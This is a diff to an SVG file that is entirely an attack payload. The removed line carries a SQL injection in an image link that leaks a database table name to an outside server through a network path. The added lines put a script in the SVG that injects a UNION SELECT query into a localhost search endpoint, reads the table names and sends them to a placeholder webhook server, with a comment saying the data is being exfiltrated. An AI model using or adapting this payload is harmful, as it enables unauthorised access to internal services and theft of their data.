@@ -1,3 +1,10 @@
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
- <image href="http://localhost/search?q=' AND (SELECT 1 FROM (SELECT LOAD_EXTENSION('\\\\your-server.com\\'||(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1))))--" />
+  <script>
+    fetch("http://localhost/search?q=" + encodeURIComponent("' UNION SELECT name,1 FROM sqlite_master WHERE type='table' AND name NOT LIKE 'history'--"))
+      .then(r => r.text())
+      .then(data => {
+        // Exfiltrate data to your server
+        new Image().src = "https://your-webhook-server.com/?leak=" + encodeURIComponent(data);
+      });
+  </script>
 </svg>
